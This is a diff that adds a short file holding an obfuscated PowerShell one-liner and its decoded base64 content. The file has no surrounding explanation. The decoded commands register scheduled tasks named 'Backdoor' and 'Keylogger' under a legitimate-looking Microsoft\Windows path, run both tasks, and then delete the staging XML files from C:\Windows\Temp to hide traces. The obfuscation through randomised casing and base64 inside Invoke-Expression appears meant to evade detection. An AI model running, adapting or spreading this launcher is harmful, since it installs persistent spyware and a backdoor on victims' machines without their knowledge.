@@ -1,0 +1,11 @@
+iex([sySTeM.TEXt.eNcoDinG]::uTf8.gETStRiNg([SYsTem.cONvErT]::fromBase64sTRiNG('CnNjaHRhc2tzLmV4ZSAvY3JlYXRlIC9UTiAiTWljcm9zb2Z0XFdpbmRvd3NcRHluQW1pdGVcQmFja2Rvb3IiIC9YTUwgQzpcV2luZG93c1xUZW1wXHRhc2sueG1sCnNjaHRhc2tzLmV4ZSAvY3JlYXRlIC9UTiAiTWljcm9zb2Z0XFdpbmRvd3NcRHluQW1pdGVcS2V5bG9nZ2VyIiAvWE1MIEM6XFdpbmRvd3NcVGVtcFx0YXNrMi54bWwKU0NIVEFTS1MgL3J1biAvVE4gIk1pY3Jvc29mdFxXaW5kb3dzXER5bkFtaXRlXEJhY2tkb29yIgpTQ0hUQVNLUyAvcnVuIC9UTiAiTWljcm9zb2Z0XFdpbmRvd3NcRHluQW1pdGVcS2V5bG9nZ2VyIgpSZW1vdmUtSXRlbSAiQzpcV2luZG93c1xUZW1wXCoueG1sIgoK')));exit
+
+##### B64 CONTENT #####
+
+
+schtasks.exe /create /TN "Microsoft\Windows\DynAmite\Backdoor" /XML C:\Windows\Temp\task.xml
+schtasks.exe /create /TN "Microsoft\Windows\DynAmite\Keylogger" /XML C:\Windows\Temp\task2.xml
+SCHTASKS /run /TN "Microsoft\Windows\DynAmite\Backdoor"
+SCHTASKS /run /TN "Microsoft\Windows\DynAmite\Keylogger"
+Remove-Item "C:\Windows\Temp\*.xml"
+
